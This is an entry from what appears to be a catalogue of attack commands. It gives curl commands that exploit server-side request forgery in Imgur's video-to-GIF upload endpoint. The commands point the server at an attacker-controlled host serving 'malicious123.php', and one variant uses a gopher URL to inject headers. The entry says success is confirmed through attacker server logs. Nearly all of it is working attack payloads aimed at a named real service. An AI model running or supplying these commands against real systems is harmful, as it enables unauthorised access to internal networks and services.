---
id: cmd-imgur-ssrf-post-001
data: >-
  curl -X POST https://imgur.com/vidgif/upload -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "source=http%3A%2F%2F192.168.218.53%2Fmalicious123.php&url=http%3A%2F%2F192.168.218.53%2Fmalicious123.php&start=56.72&stop=66.43"
tags:
  - ssrf
  - curl
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:46.099Z'
verified: false
validated: true
submitted: true
---
# imgur-vidgif-ssrf-post

## Command

```bash
curl -X POST https://imgur.com/vidgif/upload \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "source=http%3A%2F%2F192.168.218.53%2Fmalicious123.php&url=http%3A%2F%2F192.168.218.53%2Fmalicious123.php&start=56.72&stop=66.43"
```

## Description

Sends a POST request to Imgur's /vidgif/upload endpoint with arbitrary URLs in 'source' and 'url' to trigger SSRF, forcing the server to fetch from attacker-controlled hosts. Use for demonstrating HTTP/FTP/gopher SSRF in video processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: ..."` | Sets form-encoded content type | Yes |
| `-d "source=..."` | Encoded video source URL (arbitrary for SSRF) | Yes |
| `-d "url=..."` | Additional URL parameter (duplicate for redundancy) | Yes |
| `-d "start=..."` | GIF start time in seconds | Yes |
| `-d "stop=..."` | GIF stop time in seconds | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://imgur.com/vidgif/upload -H "Content-Type: application/x-www-form-urlencoded" -d "source=http%3A%2F%2Fexample.com%2Ftest&url=http%3A%2F%2Fexample.com%2Ftest&start=0&stop=10"
```

### Advanced Usage

For gopher injection:
```bash
curl -X POST https://imgur.com/vidgif/upload -H "Content-Type: application/x-www-form-urlencoded" -d "source=gopher%3A%2F%2F192.168.218.53%3A11338%2F0%250d%250aHeader%3A%20Injected&url=gopher%3A%2F%2F192.168.218.53%3A11338%2F0%250d%250aHeader%3A%20Injected&start=56.72&stop=66.43"
```

## Expected Output

HTTP response from Imgur (e.g., 200 OK with processing status); actual SSRF confirmed via attacker server logs showing inbound connections from Imgur's IP, such as GET requests or protocol handshakes.

## Related

- [[procedures/Exploit-SSRF-in-Imgur-VidGIF-Upload]]
